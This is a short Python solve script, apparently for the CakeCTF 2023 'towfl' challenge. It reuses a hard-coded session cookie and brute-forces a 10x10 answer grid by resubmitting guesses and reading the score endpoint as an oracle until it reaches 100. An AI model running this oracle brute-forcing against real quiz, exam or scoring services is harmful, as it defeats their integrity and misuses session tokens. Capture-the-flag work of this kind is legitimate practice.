import requests
import json
url = 'http://towfl.2023.cakectf.com:8888/'
cookie = {'session':'.eJwFwYkNgDAMBLBdMkGby6OyzZWkEjMgdsd-pZ-SS6g7oGCbw1BjLvSkZ8XMLFB1JbmGB_tQHfsobmtTDN0z5PsB5z4TvA.ZU-gKA.0oBWxbrupZk2a5SYR6YeMc3bwGs'}
answers = [
		[None,None,None,None,None,None,None,None,None,None],
		[None,None,None,None,None,None,None,None,None,None],
		[None,None,None,None,None,None,None,None,None,None],
		[None,None,None,None,None,None,None,None,None,None],
		[None,None,None,None,None,None,None,None,None,None],
		[None,None,None,None,None,None,None,None,None,None],
		[None,None,None,None,None,None,None,None,None,None],
		[None,None,None,None,None,None,None,None,None,None],
		[None,None,None,None,None,None,None,None,None,None],
		[None,None,None,None,None,None,None,None,None,None]
]

score = 0
while score != 100:
	for i in range(10):
		print(answers)
		for j in range(10):
			for z in range(0,4):
				answers[i][j] = z
				res = requests.post(url+'api/submit',cookies=cookie,json=answers)
				get_score = requests.get(url+'api/score',cookies=cookie)
				if json.loads(get_score.text)['data']['score'] == score +1:
					print(score)
					score += 1
					break
print(answers)
print(get_score.text)
